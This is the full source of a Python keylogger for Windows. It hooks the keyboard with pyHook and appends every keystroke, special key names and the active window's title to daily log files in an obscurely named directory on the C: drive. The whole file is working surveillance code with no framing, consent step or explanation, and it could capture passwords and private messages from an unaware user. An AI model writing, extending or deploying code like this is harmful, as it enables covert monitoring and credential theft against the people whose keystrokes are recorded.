import pyHook, pythoncom, sys, logging , os , winsound , time

dire = "C:/0089345aBCdEF/"
if not os.path.exists(dire):
    os.makedirs(dire)

date = dire
date += time.strftime("%d.%m.%Y") + ".txt" 
x = time.ctime()
with open(date, "a") as f:
            f.write("\n")
            f.write("[" + x + "] : " )

def OnKeyboardEvent(event):
    global x 

    if event.Key =="Return" :
        with open(date, "a") as f:
            f.write(" {Enter}\n")
            f.write("[" + x +"|"+event.WindowName + "] : " )

    elif event.Key == "Space" :
        with open(date, "a") as f:
            f.write(" ")
    elif event.Key == "Back" :
        with open(date, "a") as f:
            f.write("{Bkspc}")
    elif event.Key == "Lshift" :
        with open(date, "a") as f:
            f.write("{Shift}")
    elif event.Key == "Rshift" :
        with open(date, "a") as f:
            f.write("{Shift}")
    elif event.Key == "Lcontrol" :
        with open(date, "a") as f:
            f.write("{Control}")
    elif event.Key == "Rcontrol" :
        with open(date, "a") as f:
            f.write("{Control}")
    elif event.Key == "Lwin" :
        with open(date, "a") as f:
            f.write("{Win}")
    elif event.Key == "Rwin" :
        with open(date, "a") as f:
            f.write("{Win}")
    elif event.Key == "F1" :
        with open(date, "a") as f:
            f.write("{F1}")
    elif event.Key == "F2" :
        with open(date, "a") as f:
            f.write("{F2}")
    elif event.Key == "F3" :
        with open(date, "a") as f:
            f.write("{F3}")
    elif event.Key == "F4" :
        with open(date, "a") as f:
            f.write("{F4}")
    elif event.Key == "F5" :
        with open(date, "a") as f:
            f.write("{F5}")
    elif event.Key == "F6" :
        with open(date, "a") as f:
            f.write("{F6}")
    elif event.Key == "F7" :
        with open(date, "a") as f:
            f.write("{F7}")
    elif event.Key == "F8" :
        with open(date, "a") as f:
            f.write("{F8}")
    elif event.Key == "F9" :
        with open(date, "a") as f:
            f.write("{F9}")
    elif event.Key == "F10" :
        with open(date, "a") as f:
            f.write("{F10}")
    elif event.Key == "F11" :
        with open(date, "a") as f:
            f.write("{F11}")
    elif event.Key == "F12" :
        with open(date, "a") as f:
            f.write("{F12}")
    elif event.Key == "Delete" :
        with open(date, "a") as f:
            f.write("{Delete}")
    elif event.Key == "End" :
        with open(date, "a") as f:
            f.write("{End}")
    elif event.Key == "Home" :
        with open(date, "a") as f:
            f.write("{Home}")
    elif event.Key == "Insert" :
        with open(date, "a") as f:
            f.write("{Insert}")
    elif event.Key == "Prior" :
        with open(date, "a") as f:
            f.write("{PageUp}")
    elif event.Key == "Next" :
        with open(date, "a") as f:
            f.write("{PageDown}")
    elif event.Key == "Snapshot" :
        with open(date, "a") as f:
            f.write("{PrintScrn}")
    elif event.Key == "Scroll" :
        with open(date, "a") as f:
            f.write("{ScrollLock}")
    elif event.Key == "Pause" :
        with open(date, "a") as f:
            f.write("{Pause}")
    elif event.Key == "Numlock" :
        with open(date, "a") as f:
            f.write("{Numlock}")
    elif event.Key == "Escape" :
        with open(date, "a") as f:
            f.write("{Esc}")
    elif event.Key == "Tab" :
        with open(date, "a") as f:
            f.write("{Tab}")
    elif event.Key == "Capital" :
        with open(date, "a") as f:
            f.write("{CapsLock}")
    elif event.Key == "Lmenu" :
        with open(date, "a") as f:
            f.write("{Alt}")
    elif event.Key == "Rmenu" :
        with open(date, "a") as f:
            f.write("{Alt}")
    elif event.Key == "Apps" :
        with open(date, "a") as f:
            f.write("{Apps}")
    elif event.Key == "Media_Play_Pause" :
        with open(date, "a") as f:
            f.write("{Play/Pause}")
    elif event.Key == "Media_Stop" :
        with open(date, "a") as f:
            f.write("{Stop}")
    elif event.Key == "Media_Prev_Track" :
        with open(date, "a") as f:
            f.write("{PrevTrack}")
    elif event.Key == "Media_Next_Track" :
        with open(date, "a") as f:
            f.write("{NextTrack}")
    elif event.Key == "Volume_Up" :
        with open(date, "a") as f:
            f.write("{VolumeUp}")
    elif event.Key == "Volume_Down" :
        with open(date, "a") as f:
            f.write("{VolumeDown}")
    elif event.Key == "Volume_Mute" :
        with open(date, "a") as f:
            f.write("{VolumeMute}")
    
        
    else :
        with open(date, "a") as f:
            f.write(event.Key)
        
        
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()